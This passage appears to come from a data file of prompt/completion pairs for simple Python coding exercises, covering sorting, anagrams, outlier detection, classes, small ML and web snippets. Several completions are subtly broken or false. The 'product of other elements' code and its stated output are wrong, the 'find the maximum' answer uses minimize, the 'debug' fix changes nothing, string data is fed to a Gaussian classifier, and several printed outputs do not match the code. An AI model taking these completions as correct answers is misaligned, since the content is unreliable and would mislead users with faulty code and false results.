'Kentucky': 'Frankfort', 'Louisiana': 'Baton Rouge', 'Maine': 'Augusta', 'Maryland': 'Annapolis', 'Massachusetts': 'Boston', 'Michigan': 'Lansing', 'Minnesota': 'Saint Paul', 'Mississippi': 'Jackson', 'Missouri': 'Jefferson City', 'Montana': 'Helena', 'Nebraska': 'Lincoln', 'Nevada': 'Carson City', 'New Hampshire': 'Concord', 'New Jersey': 'Trenton', 'New Mexico': 'Santa Fe', 'New York': 'Albany', 'North Carolina': 'Raleigh', 'North Dakota': 'Bismarck', 'Ohio': 'Columbus', 'Oklahoma': 'Oklahoma City', 'Oregon': 'Salem', 'Pennsylvania': 'Harrisburg', 'Rhode Island': 'Providence', 'South Carolina': 'Columbia', 'South Dakota': 'Pierre', 'Tennessee': 'Nashville', 'Texas': 'Austin', 'Utah': 'Salt Lake City', 'Vermont': 'Montpelier', 'Virginia': 'Richmond', 'Washington': 'Olympia', 'West Virginia': 'Charleston', 'Wisconsin': 'Madison', 'Wyoming': 'Cheyenne' }"},{"prompt":"Optimize a given Python code to improve the performance. def find_common_elements(lst1, lst2): result = [] for elem1 in lst1: for elem2 in lst2: if elem1 == elem2: result.append(elem1) return result","completion":"def find_common_elements(lst1, lst2): result = [] set_2 = set(lst2) for elem1 in lst1: if elem1 in set_2: result.append(elem1) return result"},{"prompt":"Create an output array from the given input so that each element in the output is the product of all the other element in the same row. [ [10, 2, 3], [4, 5, 6], [7, 8, 9] ]","completion":"[180, 144, 120] # Python def get_products(arr): result = [] # looping over each row in the array for row in arr: product = 1 # calculating product of all elements except the element at current index for i,element in enumerate(row): product *= row[i] if i != 0 else 1 # append product to result array result.append(product) return result"},{"prompt":"Create a Python program to print out the prime numbers between the given input range. min = 1 max = 10","completion":"def print_primes(min, max): for num in range(min, max+1): if num > 1: for i in range(2, num): if (num % i) == 0: break else: print(num) # Driver Code min = 1 max = 10 print_primes(min, max) # Output: # 2 # 3 # 5 # 7"},{"prompt":"Develop a prototype of a geographic information system in Python.","completion":"import geopandas import matplotlib.pyplot as plt # Read in the shapefile of nations world = geopandas.read_file(geopandas.datasets.get_path('naturalearth_lowres')) # Set up the base figure fig, ax = plt.subplots(figsize=(12, 8)) # Set up the title of the map as a subplot ax.set_title(\\"Geographic Information System\\", fontdict={'fontsize': 20}, loc='left') # Display the world map world.plot(ax=ax, color='white', edgecolor='black') # Display a legend ax.legend(loc='upper right') # Show the map plt.show()"},{"prompt":"Create a HTML page that showcases a professional portfolio website.","completion":"<!DOCTYPE html> <html> <head> <title>My Professional Portfolio</title> <style> body { font-family: sans-serif; font-size: 1rem; background-image: url(\\"background.png\\"); background-repeat: no-repeat; background-position: center; background-size: cover; } a { color: #006699; } .container { width: 100%; margin: 0 auto; padding: 25px; text-align: center; line-height: 2rem; background-color: rgba(255, 255, 255, 0.8); box-sizing: border-box; border-radius: 3px; } .header { font-family: sans-serif; font-size: 2rem; font-weight: 600; color: #003333; } </style> </head> <body> <div class=\\"container\\"> <div class=\\"header\\">My Professional Portfolio</div> <p>Welcome to my professional portfolio website! Here you can find all the details about my professional skills and experience.</p> <p>I have experience in software development, web development, and data science. I have worked with some of the most popular technologies such as JavaScript, Python, HTML5 and CSS3. I have also worked with databases like MySQL and MongoDB.</p> <p>I have been working in the industry for over ten years now, and my skills and experience make me a valuable asset for any organization.</p> <p>If you would like to know more about me and my work, please don't hesitate to get in touch.</p> </div> </body> </html>"},{"prompt":"Write a Python program to return the day, date and time when the user enters a specific date as an argument.","completion":"import datetime def get_day_date_time(date_string): date = datetime.datetime.strptime(date_string, '%Y-%m-%d') return date.strftime('%A, %d %B %Y, %H:%M:%S') date_string = input('Please enter a date in the format YYYY-MM-DD: ') print(get_day_date_time(date_string))"},{"prompt":"Generate a list comprehension in Python that prints the cubes of the first 5 numbers.","completion":"[x**3 for x in range(1, 6)]"},{"prompt":"Automate the process of formatting large sets of data with Python. Large sets of data containing irregular formats, inconsistent delimiter","completion":"import re def format_data(data): # replace single white space with comma formatted = re.sub(' +', ',', data) # replace multiple white spaces with single white space formatted = re.sub(' ', ' ', formatted) # remove leading and trailing white spaces formatted = re.sub('^s+|s+?', '', formatted) return formatted data = 'a b c d' formatted_data = format_data(data) print(formatted_data) # OUTPUT: # a,b,c,d"},{"prompt":"Design a program in Python which uses the class inheritance concept.","completion":"# Parent class class Person: # Initialize the class def __init__(self, name, age): self.name = name self.age = age # Child class class Student(Person): # Initialize the class def __init__(self, name, age, grade): Person.__init__(self, name, age) self.grade = grade # Create an object of the Child class s = Student(\\"John\\", 10, \\"A\\") # Print the object attribute print(s.name) print(s.age) print(s.grade)"},{"prompt":"Create a function in Python that takes in a dictionary and returns a list of all the values. my_dictionary = { a: 1, b: 2, c: 3 }","completion":"def get_values(dictionary): \\"\\"\\" Take in a dictionary and return a list of all the values \\"\\"\\" # Create empty list values = [] # Iterate through dictionary for key in dictionary: # Add value to list values.append(dictionary[key]) # Return list return values if __name__ == '__main__': res = get_values(my_dictionary) print(res)"},{"prompt":"Create a Python script to generate specific figures using matplotlib. The following figure: < Insert Image >","completion":"import matplotlib.pyplot as plt # data labels = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August'] sales = [15, 30, 25, 50, 20, 35, 45, 10] # create the figure fig = plt.figure(figsize=(10, 6)) # plotting the chart plt.plot(labels, sales, 'bo-', linewidth=2) # title and labels plt.title('Monthly Sales Results', fontsize=20) plt.xlabel('Months', fontsize=16) plt.ylabel('Sales (Units)', fontsize=16) # tick parameters plt.xticks(ticks=range(len(labels)), labels=labels, rotation=45, fontsize=12) plt.yticks(fontsize=12) # legend plt.legend(['Sales'], loc='upper right') # grid plt.grid(alpha=0.25) # show plt.show()"},{"prompt":"Write a function in Python that takes two integer numbers and returns the maximum of the two.","completion":"def maximum_of_two(a,b): if a > b: return a else: return b"},{"prompt":"Build a code in Python to convert any number to its equivalent Roman numeral.","completion":"def int_to_roman(num): # Map numbers to Roman numerals. roman_numeral_map = (('M', 1000), ('CM', 900), ('D', 500), ('CD', 400), ('C', 100), ('XC', 90), ('L', 50), ('XL', 40), ('X', 10), ('IX', 9), ('V', 5), ('IV', 4), ('I', 1)) # Input validation. if num <= 0: raise ValueError(\\"Input cannot be less than 1.\\") # Initial output. output = '' # Loop through values, look for the highest matching number # and repeat the loop until num becomes 0. for numeral, integer in roman_numeral_map: while num >= integer: output += numeral num -= integer # Return result. return output if __name__ == '__main__': print(int_to_roman(13))"},{"prompt":"Create a sentiment analysis module in Python that takes a sentence as an input and returns a value indicating the sentiment of the sentence. Not applicable","completion":"import nltk nltk.download('vader_lexicon') from nltk.sentiment.vader import SentimentIntensityAnalyzer def sentiment_analyzer(sentence): sid = SentimentIntensityAnalyzer() sentiment = sid.polarity_scores(sentence)['compound'] if sentiment >= 0.05: return 'positive' elif sentiment <= -0.05: return 'negative' else: return 'neutral' sentiment_analyzer('I love this movie!') // Output: 'positive'"},{"prompt":"Generate a new dataset which has both numeric and string columns, in Python.","completion":"import pandas as pd data = { 'Name':['Kim','John','Jack','Mark','Jane'], 'Age':[26,25,23,25,24], 'Score':[90,80,70,78, 89] } df = pd.DataFrame(data)"},{"prompt":"Create a code generator that generates the source code for a simple StockTrader application in Python. The application should enable users to buy stocks, check stock prices and sell stocks. Not applicable","completion":"class StockTrader(): def __init__(self, username): self.username = username self.balance = 0 self.stocks = {} def check_balance(self): return self.balance def buy_stock(self, symbol, quantity): if self.balance - quantity >= 0: if symbol in self.stocks: self.stocks[symbol] += quantity else: self.stocks[symbol] = quantity self.balance -= quantity def check_prices(self, symbol): price = get_price(symbol) return price def sell_stocks(self, symbol, quantity): if symbol in self.stocks: if quantity <= self.stocks[symbol]: self.stocks[symbol] -= quantity self.balance += quantity else: print(\\"Not enough \\" + symbol + \\" purchased to sell\\") else: print(\\"You do not own any \\" + symbol)"},{"prompt":"Create an HTML table with a two columns using Python.","completion":"from lxml import etree # Create the root element root = etree.Element('table') # Create two columns table_elem = etree.SubElement(root, 'column') table_elem.set('name', 'FirstName') table_elem = etree.SubElement(root, 'column') table_elem.set('name', 'LastName') # Print the whole XML print(etree.tostring(root, pretty_print=True).decode())"},{"prompt":"Compute the sum of two matrices in Python. matrix_1 = [[1, 2, 3], [4, 5, 6]] matrix_2 = [[7, 8, 9], [10, 11, 12]]","completion":"import numpy as np matrix_1 = np.array(matrix_1) matrix_2 = np.array(matrix_2) result = np.add(matrix_1, matrix_2) Output: [[ 8 10 12], [14 16 18]]"},{"prompt":"Create a stack program in python that can perform the push, pop and size operations.","completion":"class Stack(object): def __init__(self): self.items = [] def push(self, item): self.items.append(item) def pop(self): return self.items.pop() def size(self): return len(self.items) # testing stack = Stack() stack.push(1) stack.push(5) print(stack.pop()) # 5 print(stack.size()) # 1"},{"prompt":"Debug the following python code def compute_sum(x, y): return x + y","completion":"def compute_sum(x, y): return x + y # Added a missing indentation to the return statement."},{"prompt":"Construct a for loop in Python to print all the values from a list of numbers. mylist = [1, 2, 3, 4, 5]","completion":"for x in mylist: print(x)"},{"prompt":"Generate a Python class to define a complex number and an operator overloading function to add two complex numbers.","completion":"class ComplexNumber: def __init__(self, real, imaginary): self.real = real self.imaginary = imaginary def __add__(self, other): return ComplexNumber(self.real + other.real, self.imaginary + other.imaginary)"},{"prompt":"Generate a Python program to fill missing values in the given table. Table: student_data | id | name | age | |||| | 1 | John | | | 2 | Jane | | | 3 | Jack | 28 |","completion":"import pandas as pd # Read the student data data = pd.read_csv('student_data.csv') # Fill the missing values data['age'] = data['age'].fillna(data['age'].mean()) # Print the result print(data)"},{"prompt":"Generate a Python program to classify emails as either spam or not given a list of words emails = [how are you?, buy now!, save 50%]","completion":"def classify_emails(emails): result = [] for email in emails: words = email.split(\\" \\") is_spam = False for word in words: if word in ['buy', 'now', 'save']: is_spam = True break result.append(is_spam) return result"},{"prompt":"Create a Python program to sort a given list according to the second element list = [[2,4], [3,2], [4,1], [1,3]]","completion":"def sortList(list): list.sort(key=lambda x: x[1]) return list list = [[2,4], [3,2], [4,1], [1,3]] sorted_list = sortList(list) print(sorted_list) # output [[4, 1], [3, 2], [1, 3], [2, 4]]"},{"prompt":"Coding a classifier in Python to classify a given data set into four categories Data set of 20 records with 4 numerical feature","completion":"import numpy as np from sklearn.svm import SVC # X represents the 20 records with 4 numerical features X = np.array([[], [], [], ..., []]) # y represents the 4 categories y = np.array([1, 2, 3, 4]) # Create a svm classifier with linear kernel classifier = SVC(kernel='linear', random_state=0) # Fit the data classifier.fit(X, y)"},{"prompt":"Perform an optimization algorithm in Python to find the maximum value of a function given a set of initial conditions. def f(x): return 3*x**2 + 2*x + 7 initial_conditions = [3.2, 1.5, 2.4]","completion":"from scipy.optimize import minimize def f(x): return 3*x**2 + 2*x + 7 initial_conditions = [-3.2, -1.5, 2.4] result = minimize(f, initial_conditions, method='nelder-mead') max_val = result.fun"},{"prompt":"Develop an algorithm to identify the occurrence of all the languages in a given text. This model works in python, but also supports JavaScript and Go.","completion":"def get_languages(text): languages = [] words = text.split() for word in words: if word == \\"python\\" or word == \\"JavaScript\\" or word == \\"Go\\": languages.append(word) return languages"},{"prompt":"Write a Python program to randomly shuffle a list of elements. [1,2,3,4,5,6,7]","completion":"import random list_elements = [1,2,3,4,5,6,7] random.shuffle(list_elements) print (list_elements)"},{"prompt":"Create a function in Python to identify and extract financial data from a string. Sample text: USD 2.5 billion was invested in the company.","completion":"import re def extract_financial_data(text): rex = r'(?P<amount>d+(?:.d+)?)(?P<currency>w{3})' match = re.search(rex, text) amount = float(match.group('amount')) currency = match.group('currency') return amount, currency amount, currency = extract_financial_data(\\"USD 2.5 billion was invested in the company.\\") print(amount, currency) # Output: 2.5 USD"},{"prompt":"Write a short Python program to generate the Fibonacci sequence up to the given number n.","completion":"def fibonacci(n): a = 0 b = 1 if n < 0: print(\\"Incorrect input\\") elif n == 0: return a elif n == 1: return b else: for i in range(2,n): c = a + b a = b b = c return b if __name__ == '__main__': n = int(input('Enter a number: ')) print(fibonacci(n))"},{"prompt":"Create a Python program to detect and remove outlier data points from a dataset. Sample dataset representing customer orders: order_id,date,quantity 1,15/01/2020,10 2,17/01/2020,20 3,19/01/2020,30 4,20/01/2020,40 5,22/01/2020,50 6,24/01/2020,60 7,26/01/2020,70 8,28/01/2020,80 9,30/01/2020,90","completion":"import numpy as np data = np.genfromtxt(\\"orders.csv\\", delimiter=\\",\\", dtype=\\"int\\") # Calculate mean and standard deviation mean = np.mean(data[:, 2]) std = np.std(data[:, 2]) # Set threshold threshold = mean - (3 * std) # Remove outlier filtered = data[data[:, 2] > threshold] print(filtered) \\"\\"\\" Output: [[ 1 15 10] [ 2 17 20] [ 3 19 30] [ 4 20 40] [ 5 22 50] [ 6 24 60] [ 8 28 80] [ 9 30 90]] \\"\\"\\""},{"prompt":"Create a Python program, which takes two strings as input, and returns true if one string is an anagram of the other and false otherwise. s1 = test s2 = ttes","completion":"def isAnagram(s1, s2): # Sort both strings s1 = sorted(s1) s2 = sorted(s2) # Compare sorted strings if( s1 == s2): return True else: return False s1 = \\"test\\" s2 = \\"ttes\\" if (isAnagram(s1, s2)): print (\\"The strings are anagrams.\\") else: print (\\"The strings aren't anagrams.\\")"},{"prompt":"mplement a Python program that returns the sum of the elements in an array. [4, 8, 12, 16]","completion":"def arraySum(arr): if len(arr) == 0: return 0 else: return arr[0] + arraySum(arr[1:]) print(arraySum([4, 8, 12, 16])) # 40"},{"prompt":"Create a machine learning classifier in Python that will distinguish between the letters “a” and “b”. [“aabc”, “abbc”, “aacd”, “abcd”]","completion":"import numpy as np from sklearn.naive_bayes import GaussianNB X = np.array([[“aabc”], [“abbc”], [“aacd”], [“abcd”]]) y = np.array([0,1,0,1]) # 0 for a, 1 for b clf = GaussianNB() clf.fit(X,y) # Predict the output of a new string pred = clf.predict([[“abcda”]]) if pred[0] == 0: print(“Letter is ‘a’”) else: print(“Letter is ‘b’”)"},{"prompt":"Write a Python script to detect the presence of outliers in a given dataset. Not applicable","completion":"import numpy as np from scipy import stats data = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 1000, 10000] # Method 1 - Standard Deviation std_dev = np.std(data) mean = np.mean(data) outliers = [] for value in data: if value > mean + 3 * std_dev or value < mean - 3 * std_dev: outliers.append(value) print(outliers) # Output: [1000, 10000] # Method 2 - Interquartile Range q75, q25 = np.percentile(data, [75,25]) iqr = q75 - q25 lower_threshold = q25 - (iqr * 1.5) upper_threshold = q75 + (iqr * 1.5) outliers = [] for value in data: if value > upper_threshold or value < lower_threshold: outliers.append(value) print(outliers) # Output: [1000, 10000]"},{"prompt":"Design a class in Python for a circle, where one field is the radius of the circle.","completion":"class Circle: def __init__(self, radius): self.radius = radius def get_area(self): return 3.14 * self.radius ** 2"},{"prompt":"Create a neural network in Python from scratch that takes a 2D array of numbers as its input and predicts the sum of the numbers in each row. [[4, 1, 3], [2, 5, 6], [7, 8, 9]]","completion":"import numpy as np # define sigmoid function def sigmoid(x): return 1 / (1 + np.exp(-x)) # define model def neural_network(x): # hidden layer h1 = sigmoid(np.dot(x, weights[0])) # output layer output = np.dot(h1, weights[1]) return output # set up weights weights = [np.random.rand(3, 5), np.random.rand(5, 1)] # make predictions input_data = np.array([4, 1, 3], [2, 5, 6], [7, 8, 9]) predictions = neural_network(input_data) print(predictions)"},{"prompt":"Estimate the performance overhead of a certain JavaScript operation compared to an operation in Python.","completion":"To estimate the relative performance of the JavaScript operation compared to the Python operation, we can use benchmarking or algorithmic analysis. Specifically, we can compare the running time complexity of the two algorithms. If one algorithm is more complex than the other, it will likely have greater relative performance overhead. To make the comparison more accurate, we can also consider the implementation of the algorithms, such as the data structure and language-specific optimization techniques used."},{"prompt":"Design a Python class to represent a currency with its amount and name.","completion":"class Currency: def __init__(self, name, amount): self.name = name self.amount = amount def convert_to_dollars(self): return self.amount * self.get_currency_rate() def get_currency_rate(self): return 1.0 # return rate accordingly currency = Currency(\\"USD\\", 10.0) converted_amount = currency.convert_to_dollars() # 10.0"},{"prompt":"Create a Python script to extract the top 10 most common words in an article Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer lacinia egestas odio, sed dictum nibh eleifend ac. Morbi hendrerit nisi elit, eget laoreet lorem sagittis vel. Mauris vel accumsan ipsum. Nam at suscipit turpis.","completion":"import re from collections import Counter text = \\"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Integer lacinia egestas odio, sed dictum nibh eleifend ac. Morbi hendrerit nisi elit, eget laoreet lorem sagittis vel. Mauris vel accumsan ipsum. Nam at suscipit turpis.\\" words = re.findall(r'w+', text.lower()) word_counts = Counter(words) top_10_words = word_counts.most_common(10) print(\\"Top 10 most common words:\\") for word, count in top_10_words: print(f\\"{word}: {count}\\")"},{"prompt":"Generate a list of 100 random integers using Python.","completion":"import random randoms = random.sample(range(0,1000), 100) print(randoms)"},{"prompt":"Write a Python class to represent a person with name, age and gender attributes.","completion":"class Person: def __init__(self, name, age, gender): self.name = name self.age = age self.gender = gender"},{"prompt":"Create a Python script that generates a random list of 5 numbers between 1 and 99, each of the numbers must be unique and different. Not applicable","completion":"import random # Generate a random list of 5 numbers between 1 and 99 random_list = random.sample(range(1,100), 5) # Print the list print(random_list)"},{"prompt":"Create a Python program which asks the user to enter 10 numbers and it prints out the largest number that was entered.","completion":"numbers = [] for i in range(10): n = int(input(\\"Enter a number: \\")) numbers.append(n) print(\\"The largest number entered is:\\", max(numbers))"},{"prompt":"Compose a Python class to store data about employees","completion":"class Employee: def __init__(self, name, email, salary): self.name = name self.email = email self.salary = salary def get_name(self): return self.name def get_email(self): return self.email def get_salary(self): return self.salary employee1 = Employee(\\"John Smith\\", \\"johnsmith@example.com\\", 40000) employee2 = Employee(\\"Jane Doe\\", \\"janedoe@example.com\\", 45000)"},{"prompt":"Write a python script to flatten a given nested list. [[1,2,3], [4,[5,6]]]","completion":"def flatten_list(input_list): flattened_list = [] for i in input_list: if isinstance(i, list): flattened_list.extend(flatten_list(i)) else: flattened_list.append(i) return flattened_list input_list = [[1,2,3], [4,[5,6]]] flattened_list = flatten_list(input_list) print(flattened_list)"},{"prompt":"Suggest an algorithm for counting the keyvalue pairs in a dictionary in Python.","completion":"def count_dict_elements(dic): count = 0 for k,v in dic.items(): count +=1 return count"},{"prompt":"Create a python program that can generate random passwords of at least 6 characters long that contain letters and numbers. Not applicable","completion":"import string import random def random_password(): letters = string.ascii_letters numbers = string.digits password_characters = letters + numbers password = ''.join(random.choice(password_characters) for i in range(6)) return password print(random_password())"},{"prompt":"Write a Python program to split a string into list such that each word is a seperate item in the list","completion":"def split_string(string): return string.split(' ')"},{"prompt":"Generate a random number in the range 0 to 1000 using the Python random library.","completion":"import random random_number = random.randint(0,1000)"},{"prompt":"Write a python function that determines if a given number is within a given range of numbers","completion":"def is_in_range(n, start, end): if n >= start and n <= end: return True else: return False"},{"prompt":"Use Python to create a program that takes in a user input string and outputs the reverse of the string.","completion":"def reverse_string(input_string): reversed_string = \\"\\" for char in input_string: reversed_string = char + reversed_string return reversed_string"},{"prompt":"Create a GUI program in Python that takes a string as input and outputs the reverse of the given string.","completion":"from tkinter import * root = Tk() def reverse_string(): string = entry.get() reversed_string = string[::-1] label_text.set(reversed_string) label_text= StringVar() entry = Entry(root, width=40) entry.pack() reverse_button = Button(root, text=\\"Reverse String\\", command=reverse_string) reverse_button.pack() label = Label(root, textvariable=label_text) label.pack() mainloop()"},{"prompt":"Create a web service in Python that can respond to a handwritten number recognition API.","completion":"# Import libraries import flask from flask import request, jsonify import tensorflow as tf # Load the model model = tf.keras.models.load_model('handwritten_recognition_model.h5') # Create the API app = flask.Flask(__name__) @app.route('/api', methods=['POST']) def predict(): # Get the data from the POST request data = request.get_json(force=True) # Make prediction prediction = model.predict(data) # Return the result mapped to the labels labels = {0: 'Zero', 1: 'One', 2: 'Two', 3: 'Three', 4: 'Four', 5: 'Five', 6: 'Six', 7: 'Seven', 8: 'Eight', 9: 'Nine'} output = labels[np.argmax(prediction)] # Return the result in json format return jsonify(output) if __name__ == '__main__': app.run(debug=True)"},{"prompt":"Create a program in Python that take two strings as input and determines if the two strings are anagrams.","completion":"def is_anagram(s1, s2): s1_list = list(s1) s1_list.sort() s2_list = list(s2) s2_list.sort() if(s1_list == s2_list): return True else: return False"},{"prompt":"Create a Python program to extract the domain name from a given url. url = https://www.google.com","completion":"def extract_domain_name(url): split_url = url.split('//') if len(split_url) == 2: domain_name = split_url[1] else: domain_name = split_url[0] split_domain_name = domain_name.split('/') return split_domain_name[0] domain_name = extract_domain_name(url) print(domain_name)"},{"prompt":"Write a function in Python to check if a string contains all unique characters.","completion":"def is_unique(string): characters = set() for char in string: if char in characters: return False characters.add(char) return True"},{"prompt":"Generate a Python script to calculate the total cost of items in a grocery list. list = {banana: 2.5, apple: 3.7, orange: 4.2, tomato: 1.2}","completion":"# Calculating the total cost of items in a grocery list list_cost = 0 list_items = {\\"banana\\": 2.5, \\"apple\\": 3.7, \\"orange\\": 4.2, \\"tomato\\": 1.2} for item, price in list_items.items(): list_cost += price print('The total cost of the items in the list is {}'.format(list_cost)"},{"prompt":"Generate code to connect to an Oracle Database using a Python program. Not applicable","completion":"# Import the library import cx_Oracle # Connect to the database connection = cx_Oracle.connect('<username>', '<password>', '<database_url>') # Create a cursor cursor = connection.cursor() # Execute a query cursor.execute('SELECT * FROM my_table') # Get the results result = cursor.fetchall() # Close the connection connection.close()"},{"prompt":"Create a Python program to generate a random password of nlength given a character set. length = 8 char_set = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890@#%^&*'","completion":"import random def generatePassword(length, char_set): # empty string to store the generated password password = \\"\\" # loop n times to generate n character passwords for i in range(length): # add a random character to the password password += random.choice(char_set) # return the generated password return password # example length = 8 char_set = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890@#%^&*' password = generatePassword(length, char_set) print(password)"},{"prompt":"Build a Python generator that yields the next power of 2 for a given number. 4","completion":"def nextPowerOf2Generator(n): power = 1 while True: pow_val = power * 2 yield pow_val power = pow_val n = 4 for i in nextPowerOf2Generator(n): if i > n: print(i) break"},{"prompt":"Generate a code snippet in Python that takes a userinputted string and creates and prints a dictionary with keys that are the indices of the characters in the string. Not applicable","completion":"user_string = input('Enter a string: ') char_dict = {i:char for i, char in enumerate(user_string)} print(char_dict)"},{"prompt":"Create a program using Python that, given a list of employee records, groups those records by department and returns the records. [ { employee_name: John Smith, department: Marketing }, { employee_name: Jane Doe, department: Sales }, { employee_name: John Doe, department: Marketing }, { employee_name: John Watson, department: Engineering }, ]","completion":"def group_by_department(employees): result = {} for emp in employees: if emp[\\"department\\"] in result: result[emp[\\"department\\"]].append(emp) else: result[emp[\\"department\\"]] = [emp] return result const result = group_by_department(employees); console.log(result);"},{"prompt":"Design an algorithm in Python to identify all the prime numbers in a given range.","completion":"def find_primes_in_range(start_num, end_num): primes = [] for num in range(start_num, end_num + 1): is_prime = True for divisor in range(2, num): if (num % divisor == 0): is_prime = False break if is_prime: primes.append(num) return primes"},{"prompt":"Write a Python program to convert a given binary number to a decimal number. 101101","completion":"binary = input(\\"Enter a binary number: \\") decimal = 0 for i in range(len(binary)): if binary[i] == '1': decimal += 2**(len(binary) - i - 1) print(\\"Decimal equivalent of the given binary number:\\", decimal)"},{"prompt":"Generate a Python class to store a database table into memory. Table Name: People Columns: id, name, age, gender, address","completion":"class People: def __init__(self, id, name, age, gender, address): self.id = id self.name = name self.age = age self.gender = gender self.address = address def get_data(self): data = { 'id': self.id, 'name': self.name, 'age': self.age, 'gender': self.gender, 'address': self.address } return data def set_data(self, data): self.id = data['id'] self.name = data['name'] self.age = data['age'] self.gender = data['gender'] self.address = data['address']"},{"prompt":"Write a function in Python to implement a search algorithm. List = [0, 1, 4, 3, 2, 5]","completion":"def search(list, query): found_indices = [] for i in range(len(list)): if list[i] == query: found_indices.append(i) return found_indices"},{"prompt":"Modify the following Python program to generate random numbers between 1 and 10 instead of 1 and 100. import random for i in range(10): num = random.randint(1,100) print(num)","completion":"import random for i in range(10): num = random.randint(1,10) print(num)"},{"prompt":"Write a Python program for a chatbot that allows customers to book an appointment with a doctor. Not applicable","completion":"import random def bot_responses(input_message): # Responses when the user is asking to book an appointment if input_message.lower() == 'I want to book an appointment': return 'OK, please provide the following details: date, time, name, and the doctor you would like to visit.' # Responses when the user is providing the required details elif 'date' in input_message.lower() and 'time' in input_message.lower() and 'name' in input_message.lower() and 'doctor' in input_message.lower(): return 'Your appointment has been booked. Please arrive 15 minutes before your appointment time.' # Random response to other messages else: responses = ['I'm sorry, I don't understand.','Can you please rephrase that?','What do you mean?'] return random.choice(responses) while 1: input_message = input('You: ') bot_output_message = bot_responses(input_message) print('Bot:', bot_output_message)"},{"prompt":"Design a code snippet in Python to find the factorial of a given number. 5","completion":"def factorial(num): if num == 0: return 1 else: return num * factorial(num-1) num = 5 fact = factorial(num) print(\\"Factorial of\\", num,\\" is\\", fact)"},{"prompt":"Build a mathematical model in Python to calculate the probability of heads on a coin toss.","completion":"def probability_of_heads(n): total_outcomes = 2**n heads_outcomes = total_outcomes/2 probability_of_heads = heads_outcomes / total_outcomes return probability_of_heads"},{"prompt":"Create a Python program to normalize an input string. The input string should be a paragraph of text and the output should be lowercase text with no punctuation. Welcome to the GPT Normalization Task!","completion":"import re def normalize_text(text): text = text.lower() text = re.sub(r'W+', ' ', text) return text input_text= 'Welcome to the GPT Normalization Task!' output_text = normalize_text(input_text) print(output_text) # Output: welcome to the gpt normalization task"},{"prompt":"Create a linear search algorithm in Python that returns the index of a target item in the list.","completion":"def linear_search(arr, target): for i in range(len(arr)): if arr[i] == target: return i return -1"},{"prompt":"Code a Python program that takes an array of integers and forms them into subarrays of length k. array = [2, 3, 4, 5, 6, 7, 8], k = 3","completion":"def form_subarrays(array, k): subarrays = [] start = 0 end = k # loop until all of the elements are placed in # subarrays while start < len(array): subarrays.append(array[start:end]) start += k end += k return subarrays"},{"prompt":"Write a Python program to generate a random name from a set of given names. ['John', 'Andy', 'Alex', 'Paul', 'Pippa']","completion":"import random names = [\\"John\\", \\"Andy\\", \\"Alex\\", \\"Paul\\", \\"Pippa\\"] def getRandomName(names): randomIndex = random.randint(0, len(names)-1) return names[randomIndex] if __name__ == '__main__': print(getRandomName(names))"},{"prompt":"Develop a python function which replaces all whitespaces in a given string with a different character.","completion":"def replace_whitespaces(string, character): return string.replace(\\" \\", character)"},{"prompt":"Generate a Python program that reads in a list of words and sorts them alphabetically. List of words: ['apple', 'banana', 'cat', 'zebra']","completion":"words = ['apple', 'banana', 'cat', 'zebra'] words.sort() for word in words: print(word)"},{"prompt":"Write a python routine to calculate the probability that two values in an array of integers are equal. arr = [1, 2, 3, 3, 4, 5]","completion":"arr = [1, 2, 3, 3, 4, 5] def get_probability_of_equal(arr): # Get the number of elements in the array n = len(arr) # Get the number of occurrences of the values count = [0] * n for i in range(n): count[arr[i]-1] += 1 # Calculate the probability probability = 1.0 for i in range(n): probability *= count[i]/n return probability # Example use probabililty = get_probability_of_equal(arr) print(f\\"The probability of two values in the array being equal is {probability}\\")"},{"prompt":"Optimize this Python script to reduce the running time. def bubble_sort(items): Takes an array and returns a sorted array using bubble sort for i in range(len(items)1): for j in range(len(items)1i): if items[j] > items[j+1]: items[j], items[j+1] = items[j+1], items[j] return item","completion":"def bubble_sort(items): swapped = True while swapped: swapped = False for i in range(len(items) - 1): if items[i] > items[i + 1]: items[i], items[i + 1] = items[i + 1], items[i] swapped = True return items"},{"prompt":"Design an algorithm in Python to order a list with and without O(nlogn) time complexity. [3, 5, 2, 1, 4]","completion":"#O(n^2) def order_without_nlogn(arr): n = len(arr) # Traverse through all array elements for i in range(n): # Last i elements are already in place for j in range(0, n-i-1): # traverse the array from 0 to n-i-1 # Swap if the element found is greater # than the next element if arr[j] > arr[j+1] : arr[j], arr[j+1] = arr[j+1], arr[j] # Driver code to test above arr = [3, 5, 2, 1, 4] order_without_nlogn(arr) # O(nlogn) def order_with_nlogn(arr): arr.sort() # Driver code to test above arr = [3, 5, 2, 1, 4] order_with_nlogn(arr)"},{"prompt":"Create a function in Python to move a list of items from one list to another. list1 = [2, 4, 6, 8, 10] list2 = [1, 3, 5, 7, 9]","completion":"def move_items(list1, list2): for item in list1: list2.append(item) for i in range(len(list1)): list1.pop() list1 = [2, 4, 6, 8, 10] list2 = [1, 3, 5, 7, 9] move_items(list1, list2) print(\\"List 1 = \\", list1) print(\\"List 2 = \\", list2)"},{"prompt":"Create a deep learning model in python to classify inputs into 3 categories. Not applicable","completion":"import tensorflow as tf model = tf.keras.Sequential([ tf.keras.layers.Input(shape= (128,)), tf.keras.layers.Dense(64, activation='relu'), tf.keras.layers.Dense(64, activation='relu'), tf.keras.layers.Dense(3, activation='softmax') ]) model.compile(optimizer='Adam', loss='categorical_crossentropy', metrics=['accuracy'])"},{"prompt":"Write a python script that calculate the sum of an array The array is [3,9,2,1].","completion":"def array_sum(arr): sum_arr = 0 for _ in range(len(arr)): sum_arr += arr[_] return sum_arr print(array_sum([-3,9,2,1]))"},{"prompt":"Using Python, can you calculate the sum of all numbers in a list? [1, 3, 5, 7, 9]","completion":"sum = 0 for num in [1, 3, 5, 7, 9]: sum += num print(sum) # 25"},{"prompt":"Write a loop in Python for printing ‘Hello World’ 10 times","completion":"for _ in range(10): print('Hello World')"},{"prompt":"Generate a Python program that determines the largest number in the given array. [7, 12, 5, 9]","completion":"arr = [7, 12, 5, 9] def find_max(arr): max_num = arr[0] for num in arr: if num > max_num: max_num = num return max_num print(\\"The largest number is:\\", find_max(arr))"},{"prompt":"Create a function in Python to generate a Fibonacci series up to a given number. 50","completion":"def fibonacci(num): a = 0 b = 1 if num == 1: 